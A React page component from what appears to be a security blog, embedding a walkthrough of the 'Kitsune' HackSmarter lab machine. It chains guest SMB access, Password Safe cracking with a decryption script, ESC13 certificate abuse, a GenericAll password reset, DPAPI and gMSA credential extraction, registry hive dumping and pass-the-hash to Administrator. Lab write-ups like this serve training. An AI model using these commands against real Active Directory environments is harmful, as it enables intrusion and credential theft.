import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired, FaCopy, FaCheck } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import InfoStatus from '../../../components/InfoStatus';
import ScrollToTop from '../../../components/ScrollToTop';
import DynamicSEO from '../../../components/DynamicSEO';
import './KitsuneWalkthrough.css';

const KitsuneWalkthrough = () => {
  const navigate = useNavigate();

  const CodeBlock = ({ language, children }) => {
    const [copied, setCopied] = useState(false);

    const handleCopy = async () => {
      try {
        await navigator.clipboard.writeText(children);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error('Failed to copy text: ', err);
      }
    };

    const displayLanguage = language === 'bash' ? 'Shell' : language;
    const showPrompt = language === 'bash' || language === 'shell';

    return (
      <div className="code-block-container">
        <div className="code-block-header">
          <span className="code-block-language">{displayLanguage || 'Terminal'}</span>
          <button
            className={'copy-button ' + (copied ? 'copied' : '')}
            onClick={handleCopy}
            title={copied ? 'Copied!' : 'Copy to clipboard'}
          >
            {copied ? <FaCheck /> : <FaCopy />}
          </button>
        </div>
        <pre>
          <code className={'terminal-code ' + (language ? 'language-' + language : '')}>
            {showPrompt && <span className="terminal-prompt">$ </span>}
            {children}
          </code>
        </pre>
      </div>
    );
  };

  const parseInlineMarkdown = (text) => {
    const parts = [];
    let lastIndex = 0;
    let key = 0;

    const regex = /(\[.*?\]\(.*?\)|\*\*.*?\*\*|\*.*?\*|`.*?`)/g;
    let match;

    while ((match = regex.exec(text)) !== null) {
      if (match.index > lastIndex) {
        parts.push(text.substring(lastIndex, match.index));
      }

      const matched = match[0];

      if (matched.startsWith('[') && matched.includes('](')) {
        const linkMatch = matched.match(/\[(.*?)\]\((.*?)\)/);
        if (linkMatch) {
          const [, linkText, linkUrl] = linkMatch;
          parts.push(
            <a key={key++} href={linkUrl} target="_blank" rel="noopener noreferrer" className="content-link">
              {linkText}
            </a>
          );
        }
      } else if (matched.startsWith('**') && matched.endsWith('**')) {
        parts.push(<strong key={key++}>{matched.slice(2, -2)}</strong>);
      } else if (matched.startsWith('*') && matched.endsWith('*')) {
        parts.push(<em key={key++}>{matched.slice(1, -1)}</em>);
      } else if (matched.startsWith('`') && matched.endsWith('`')) {
        parts.push(<code key={key++} className="inline-code">{matched.slice(1, -1)}</code>);
      }

      lastIndex = regex.lastIndex;
    }

    if (lastIndex < text.length) {
      parts.push(text.substring(lastIndex));
    }

    return parts.length > 0 ? parts : text;
  };

  const writeup = {
    id: 'kitsune-walkthrough',
    title: 'Kitsune Walkthrough',
    excerpt: 'Kitsune is an easy difficulty Windows Active Directory machine from HackSmarter. Guest SMB access reveals a Password Safe database on a custom share, which is cracked to recover domain credentials. ADCS enumeration discovers an ESC13 vulnerability on a custom certificate template linked to the HelpDesk group, which has GenericAll over a domain user. Exploiting the certificate chain grants access to DPAPI-encrypted credentials, a gMSA password, and ultimately Backup Operators privileges for full domain compromise via registry hive extraction.',
    date: 'Oct 23, 2026',
    tags: ['Hs', 'Windows', 'Ad', 'Smb', 'Adcs', 'ESC13', 'DPAPI', 'Gmsa', 'Backup-Operators', 'Password-Cracking'],
    difficulty: 'Easy',
    os: 'Windows',
    ip: '10.0.28.182',
    content: `## Overview
Kitsune is an **easy** difficulty Windows Active Directory machine from **HackSmarter**, set on a Windows Server 2025 domain controller (\`DC01.kitsune.local\`). A guest SMB session reveals a Password Safe database on a custom share, which is cracked to recover domain credentials for \`ranch\`. ADCS enumeration discovers an **ESC13** vulnerability on the \`Kitsune-User\` certificate template whose issuance policy is linked to the \`HelpDesk\` group, granting its privileges via PAC enrichment. HelpDesk's **GenericAll** over \`schlop\` enables a password reset and WinRM access, where a DPAPI-encrypted PSCredential file exposes credentials for \`pebble\`. As a member of the \`IT\` group, \`pebble\` can read the gMSA password of \`svc_gmsa$\`, a \`Backup Operators\` member whose \`SeBackupPrivilege\` allows registry hive extraction and pass-the-hash as Administrator for full domain compromise.

The full attack path:
\`\`\`
ranch -> ESC13 (Kitsune-User cert) -> HelpDesk privileges -> GenericAll -> schlop -> DPAPI cred -> pebble [IT] -> ReadGMSAPassword -> svc_gmsa$ [Backup Operators] -> DC01
\`\`\`

## Enumeration
### Port Scanning
Running a full TCP \`Nmap\` scan against the target reveals services typical of a Windows Active Directory domain controller. The SSL certificate on RDP (port 3389) leaks the hostname \`DC01.kitsune.local\`, confirming this is the domain controller:
\`\`\`bash
sudo nmap -sS -sV -sC -Pn -n -p- --min-rate=10000 -vv 10.0.28.182 -oN nmap/nmap.tcp

PORT      STATE SERVICE      VERSION
53/tcp    open  tcpwrapped
135/tcp   open  tcpwrapped
139/tcp   open  netbios-ssn?
445/tcp   open  tcpwrapped
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=DC01.kitsune.local
49666/tcp open  tcpwrapped
49692/tcp open  tcpwrapped
49725/tcp open  tcpwrapped
49824/tcp open  tcpwrapped
\`\`\`

Key open ports:
- **Port 53**: DNS service (standard for a DC)
- **Port 135**: RPC endpoint mapper
- **Port 139/445**: SMB/NetBIOS file sharing
- **Port 3389**: Remote Desktop Protocol (RDP)

Adding the domain and hostname to \`/etc/hosts\` for proper name resolution:
\`\`\`bash
sudo sh -c 'echo "10.0.28.182 DC01.kitsune.local DC01 kitsune.local" >> /etc/hosts'
\`\`\`

### SMB Enumeration
A null session fails to list shares, but authenticating as \`guest\` with an empty password succeeds. The share listing reveals a custom share called \`Files\` alongside the default shares. This is immediately interesting as custom shares often contain useful data:
\`\`\`bash
netexec smb 10.0.28.182 --shares -u 'guest' -p ''
\`\`\`
![netexec SMB enumeration with guest showing Files share](/images/writeups/kitsune/1.png)

### RID Brute Force
Using the guest session, RID brute-forcing enumerates all domain users. This technique iterates through Security Identifier (SID) Relative IDs to discover accounts that would otherwise require authenticated LDAP access. The enumeration reveals several domain users and a gMSA service account:
\`\`\`bash
netexec smb 10.0.28.182 -u 'guest' -p '' --rid-brute
\`\`\`
![RID brute force revealing domain users](/images/writeups/kitsune/2.png)

The discovered users:
| User           | Type              |
|----------------|-------------------|
| Administrator  | Domain Admin      |
| ranch          | Domain User       |
| schlop         | Domain User       |
| pebble         | Domain User       |
| ross           | Domain User       |
| protagonist    | Domain User       |
| svc_gmsa$      | gMSA Account      |

### Password Safe Database
Downloading all files from the \`Files\` share retrieves several decoy documents and a **Password Safe database** (\`logins.psafe3\`). Password Safe is an open-source password manager that stores credentials in an encrypted database protected by a master password:
\`\`\`bash
smbclient //10.0.28.182/Files -U 'guest%' -c 'prompt OFF; mget *'
\`\`\`
![Downloading files from the Files SMB share](/images/writeups/kitsune/3.png)

### Cracking the Password Safe
To extract the hash from the Password Safe database for offline cracking, \`pwsafe2john\` converts it into a format that John the Ripper can process:
\`\`\`bash
python3 /opt/Tools/Password-Tools/john/run/pwsafe2john.py logins.psafe3
\`\`\`
![pwsafe2john extracting hash from Password Safe database](/images/writeups/kitsune/4.png)

Running John the Ripper with the \`rockyou.txt\` wordlist cracks the master password quickly, revealing \`hellokitty\`:
\`\`\`bash
john psafe.hash --wordlist=/usr/share/wordlists/rockyou.txt
\`\`\`
![John cracking the Password Safe master password](/images/writeups/kitsune/5.png)

### Decrypting the Database
With the cracked master password, a Python script decrypts the Password Safe database using the Twofish cipher (the encryption algorithm used by the PSAFE3 format). The database contains three sets of credentials:
\`\`\`bash
python3.11 -c "
import struct, hmac
from hashlib import sha256
from twofish import Twofish

with open('loot/logins.psafe3', 'rb') as f:
    tag = f.read(4)
    salt = f.read(32)
    iterations = struct.unpack('<I', f.read(4))[0]
    hp = f.read(32)
    b1 = f.read(16); b2 = f.read(16)
    b3 = f.read(16); b4 = f.read(16)
    iv = f.read(16)
    rest = f.read()

password = b'hellokitty'
key = sha256(password + salt).digest()
for i in range(iterations):
    key = sha256(key).digest()

cipher = Twofish(key)
k = cipher.decrypt(b1) + cipher.decrypt(b2)
data_cipher = Twofish(k)
eof_marker = b'PWS3-EOFPWS3-EOF'

plaintext = b''
prev = iv
i = 0
while i < len(rest) - 48:
    block = rest[i:i+16]
    if block == eof_marker: break
    decrypted = data_cipher.decrypt(block)
    xored = bytes(a ^ b for a, b in zip(decrypted, prev))
    plaintext += xored
    prev = block
    i += 16

pos = 0
entries = []
current = {}
while pos < len(plaintext):
    if pos + 5 > len(plaintext): break
    field_len = struct.unpack('<I', plaintext[pos:pos+4])[0]
    field_type = plaintext[pos+4]
    field_data = plaintext[pos+5:pos+5+field_len]
    total = 5 + field_len
    padded = ((total + 15) // 16) * 16
    pos += padded
    if field_type == 0xFF:
        if current: entries.append(current); current = {}
    elif field_type == 0x03: current['title'] = field_data.decode('utf-8', errors='replace')
    elif field_type == 0x04: current['user'] = field_data.decode('utf-8', errors='replace')
    elif field_type == 0x06: current['pass'] = field_data.decode('utf-8', errors='replace')

for e in entries:
    print(f\\"Title: {e.get('title','?')}  |  User: {e.get('user','?')}  |  Pass: {e.get('pass','?')}\\")
"
\`\`\`
![Password Safe decryption revealing three credential sets](/images/writeups/kitsune/6.png)

The decrypted entries reveal:
| Title               | User   | Password       |
|---------------------|--------|----------------|
| SQL Credentials     | root   | a%KlRhqbuRgL   |
| Duo Login           | admin  | I#zmE{z[n3HM   |
| Network Credentials | ranch  | R@nch2026!     |

The "Network Credentials" entry for \`ranch\` matches one of the domain users discovered during RID brute-forcing. Verifying with netexec confirms valid credentials and shows ranch has access to the \`NETLOGON\` and \`SYSVOL\` shares, confirming this is a legitimate domain account:
\`\`\`bash
nxc smb 10.0.28.182 -u 'ranch' -p 'R@nch2026!' --shares
\`\`\`
![netexec confirming ranch credentials and share access](/images/writeups/kitsune/7.png)

### ADCS Enumeration
With valid domain credentials, \`certipy\` is used to enumerate Active Directory Certificate Services (ADCS) for vulnerable certificate templates. The scan discovers an **ESC13** vulnerability on the custom \`Kitsune-User\` template:
\`\`\`bash
certipy find -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip 10.0.28.182 -stdout -vulnerable
\`\`\`
![Certipy finding ESC13 vulnerability on Kitsune-User template](/images/writeups/kitsune/8.png)

[ESC13](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53) is a certificate template misconfiguration where the template's **issuance policy** is linked to an Active Directory group via an [OID group link](https://bloodhound.specterops.io/resources/edges/oid-group-link). When a user enrolls in this template and authenticates with the resulting certificate, the KDC automatically adds the linked group's SID to the user's Privilege Attribute Certificate (PAC). This effectively grants the user membership privileges in that group without actually being a member.

In this case:
- The \`Kitsune-User\` template allows **any Domain User** to enroll
- It enables **Client Authentication** (can be used for PKINIT)
- Its issuance policy is linked to the **HelpDesk** group
- BloodHound reveals that HelpDesk has **GenericAll** over the user \`schlop\`

## Foothold
### ESC13 Certificate Exploitation
Requesting a certificate from the vulnerable \`Kitsune-User\` template. The template requires a 4096-bit RSA key (\`-key-size 4096\`), which must be specified or the request will fail:
\`\`\`bash
certipy req -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip 10.0.28.182 -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -key-size 4096 -debug
\`\`\`
![Certipy requesting certificate from Kitsune-User template](/images/writeups/kitsune/9.png)

Authenticating with the obtained certificate via PKINIT. Because of the ESC13 issuance policy link, the KDC adds the HelpDesk group SID to ranch's PAC, granting HelpDesk privileges for this session:
\`\`\`bash
certipy auth -pfx ranch.pfx -dc-ip 10.0.28.182
\`\`\`
![Certipy PKINIT authentication obtaining TGT with HelpDesk privileges](/images/writeups/kitsune/10.png)

### Abusing GenericAll
With HelpDesk privileges (via the enriched PAC), the GenericAll ACE over \`schlop\` allows resetting their password without knowing the current one. Using \`bloodyAD\` with Kerberos authentication (leveraging the TGT obtained from certipy):
\`\`\`bash
export KRB5CCNAME=ranch.ccache
bloodyAD -d kitsune.local -k --host DC01.kitsune.local set password schlop 'Pwned123!'
\`\`\`
![bloodyAD successfully resetting schlop password via GenericAll](/images/writeups/kitsune/11.png)

Confirming the new credentials work and checking available shares:
\`\`\`bash
nxc smb 10.0.28.182 -u 'schlop' -p 'Pwned123!' --shares
\`\`\`
![netexec confirming schlop credentials and share access](/images/writeups/kitsune/12.png)

Checking for WinRM access, \`schlop\` is a member of the Remote Management Users group, granting shell access:
\`\`\`bash
nxc winrm 10.0.28.182 -u 'schlop' -p 'Pwned123!'
\`\`\`
![netexec confirming schlop has WinRM access](/images/writeups/kitsune/13.png)

### Shell Access
Connecting via Evil-WinRM as \`schlop\`:
\`\`\`bash
evil-winrm -i 10.0.28.182 -u 'schlop' -p 'Pwned123!'
\`\`\`
![Evil-WinRM shell as schlop on DC01](/images/writeups/kitsune/14.png)

### DPAPI Credential Recovery
In schlop's Documents folder, a DPAPI-encrypted PSCredential file (\`networkAuth.cred\`) is found. PSCredential is a PowerShell object that stores a username and an encrypted password. The encryption uses Windows [Data Protection API (DPAPI)](https://z3r0th.medium.com/abusing-dpapi-40b76d3ff5eb), which ties the decryption key to the user's session, meaning only the user who created the file (or someone logged in as them) can decrypt it.

Decrypting the credential as \`schlop\` reveals the password for \`pebble\`:
\`\`\`powershell
$cred = Import-Clixml C:\\Users\\schlop\\Documents\\networkAuth.cred
$cred.GetNetworkCredential().Password
\`\`\`
![DPAPI decryption revealing pebble credentials](/images/writeups/kitsune/15.png)
![Password for pebble revealed as PebbleIs47!](/images/writeups/kitsune/16.png)

## Privilege Escalation
### gMSA Password Extraction
\`pebble\` is a member of the \`IT\` group, which has [ReadGMSAPassword](https://www.hackingarticles.in/credential-dumping-gmsa) rights on \`svc_gmsa$\`. Group Managed Service Accounts (gMSA) are Active Directory accounts with automatically rotated, complex passwords stored in the \`msDS-ManagedPassword\` attribute. Users and groups with \`ReadGMSAPassword\` rights can read this attribute and extract the password hash:
\`\`\`bash
nxc ldap 10.0.28.182 -u 'pebble' -p 'PebbleIs47!' --gmsa
\`\`\`
![netexec extracting gMSA password hash for svc_gmsa$](/images/writeups/kitsune/17.png)

### Backup Operators Abuse
\`svc_gmsa$\` is a member of the [Backup Operators](https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/) group, which has [SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) on the domain controller. This privilege allows reading any file on the system regardless of ACLs, a well-known path to domain compromise via registry hive extraction.

Using the \`backup_operator\` module in netexec to dump the SAM, SYSTEM, and SECURITY registry hives. The SYSTEM hive required a manual download from SYSVOL where the module saved it:
\`\`\`bash
nxc smb 10.0.28.182 -u 'svc_gmsa$' -H 085691c182d60ab1a12466ce7b50d29d -M backup_operator

smbclient //10.0.28.182/SYSVOL -U 'svc_gmsa$' --pw-nt-hash 085691c182d60ab1a12466ce7b50d29d -c 'get SYSTEM'
\`\`\`
![Downloading registry hives via Backup Operators privilege](/images/writeups/kitsune/18.png)

### Extracting Hashes
Using Impacket's \`secretsdump\` to extract local account hashes and cached domain credentials from the dumped registry hives:
\`\`\`bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
\`\`\`
![secretsdump extracting Administrator NTLM hash from registry hives](/images/writeups/kitsune/19.png)

### Domain Compromise
With the Administrator's NTLM hash, pass-the-hash via Evil-WinRM grants a privileged shell on the domain controller, completing the compromise:
\`\`\`bash
evil-winrm -i 10.0.28.182 -u 'Administrator' -H 2dffec5d0dda0cbc8bf571471641e001
\`\`\`
![Evil-WinRM shell as Administrator on DC01](/images/writeups/kitsune/20.png)

## Conclusion
Kitsune is an easy-difficulty Windows Active Directory machine that demonstrates a realistic multi-stage attack chain combining certificate abuse, ACL exploitation, and credential recovery techniques. Despite its easy rating, the machine covers a wide range of Active Directory attack vectors that are commonly seen in real-world engagements.

The attack path involved:

- **Guest SMB Access**: Authenticating as guest to discover and download a Password Safe database from a custom share
- **Password Safe Cracking**: Extracting and cracking the database master password, then decrypting stored credentials to recover domain user access
- **ESC13 Certificate Abuse**: Exploiting an ADCS template whose issuance policy is linked to the HelpDesk group, gaining its privileges through PAC enrichment via PKINIT. [SpecterOps - ESC13 Abuse Technique](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
- **GenericAll Password Reset**: Leveraging HelpDesk's GenericAll ACE over schlop to force a password change and obtain WinRM access
- **DPAPI Credential Recovery**: Decrypting a PSCredential file in schlop's session to recover pebble's password. [Abusing DPAPI - z3r0th](https://z3r0th.medium.com/abusing-dpapi-40b76d3ff5eb)
- **gMSA Password Extraction**: Using pebble's IT group membership to read the managed password hash of svc_gmsa$. [Credential Dumping gMSA - HackingArticles](https://www.hackingarticles.in/credential-dumping-gmsa)
- **Backup Operators Abuse**: Extracting registry hives via SeBackupPrivilege and recovering the Administrator NTLM hash for pass-the-hash. [Domain Escalation Backup Operator - PentestLab](https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/)

**Tools Used**: Nmap, NetExec (nxc), smbclient, John the Ripper, Certipy, bloodyAD, BloodHound, Evil-WinRM, Impacket (secretsdump)
`};

  return (
    <>
      <DynamicSEO
        type="writeup"
        data={{
          title: writeup.title,
          excerpt: writeup.excerpt,
          id: writeup.id,
          image_url: '/images/writeups/kitsune/machine.png',
          os_type: writeup.os,
          difficulty: writeup.difficulty,
          tags: writeup.tags
        }}
      />
      <motion.div
        className="writeup-detail-page"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>

        <motion.div
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1 id="writeup-title">{writeup.title}</h1>

          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>

          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS:
                    <img
                      src={`/os-icons/${writeup.os}.png`}
                      alt={`${writeup.os} Icon`}
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/kitsune/machine.png" alt="Kitsune" className="machine-image" />
              </div>
            </div>
          </div>

          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;

              while (i < lines.length) {
                const line = lines[i];

                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{parseInlineMarkdown(line.substring(2))}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{parseInlineMarkdown(line.substring(3))}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{parseInlineMarkdown(line.substring(4))}</h3>);
                } else if (line.startsWith('```')) {
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;

                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }

                  elements.push(
                    <CodeBlock key={i} language={language}>
                      {codeLines.join('\n')}
                    </CodeBlock>
                  );
                } else if (line.startsWith('![')) {
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.startsWith('<InfoStatus')) {
                  const titleMatch = line.match(/title="([^"]*)"/);
                  const messageMatch = line.match(/message="([^"]*)"/);
                  if (titleMatch && messageMatch) {
                    elements.push(
                      <InfoStatus
                        key={i}
                        title={titleMatch[1]}
                        message={messageMatch[1]}
                      />
                    );
                  }
                } else if (line.startsWith('|')) {
                  const tableRows = [];
                  while (i < lines.length && lines[i].startsWith('|')) {
                    tableRows.push(lines[i]);
                    i++;
                  }
                  i--;

                  const headerCells = tableRows[0].split('|').filter(c => c.trim());
                  const dataRows = tableRows.slice(2);

                  elements.push(
                    <div key={i} style={{ overflowX: 'auto', margin: '1rem 0' }}>
                      <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.9rem' }}>
                        <thead>
                          <tr>
                            {headerCells.map((cell, ci) => (
                              <th key={ci} style={{ padding: '0.5rem 1rem', borderBottom: '2px solid var(--border-color)', textAlign: 'left', color: 'var(--text-primary)' }}>
                                {cell.trim()}
                              </th>
                            ))}
                          </tr>
                        </thead>
                        <tbody>
                          {dataRows.map((row, ri) => (
                            <tr key={ri}>
                              {row.split('|').filter(c => c.trim()).map((cell, ci) => (
                                <td key={ci} style={{ padding: '0.5rem 1rem', borderBottom: '1px solid var(--border-color)', color: 'var(--text-secondary)', fontFamily: ci > 0 ? "'Courier New', monospace" : 'inherit' }}>
                                  {parseInlineMarkdown(cell.trim())}
                                </td>
                              ))}
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  );
                } else if (line.startsWith('- ')) {
                  const listItems = [];
                  while (i < lines.length && lines[i].startsWith('- ')) {
                    listItems.push(lines[i].substring(2));
                    i++;
                  }
                  i--;

                  elements.push(
                    <ul key={i} style={{ margin: '1rem 0', paddingLeft: '2rem' }}>
                      {listItems.map((item, li) => (
                        <li key={li} style={{ marginBottom: '0.5rem', color: 'var(--text-secondary)' }}>
                          {parseInlineMarkdown(item)}
                        </li>
                      ))}
                    </ul>
                  );
                } else if (line.trim()) {
                  elements.push(<p key={i}>{parseInlineMarkdown(line)}</p>);
                } else {
                  elements.push(<br key={i} />);
                }

                i++;
              }

              return elements;
            })()}
          </div>
        </motion.div>
      </div>

      <TableOfContents content={writeup.content} title={writeup.title} />

      <ScrollToTop />
      </motion.div>
    </>
  );
};

export default KitsuneWalkthrough;
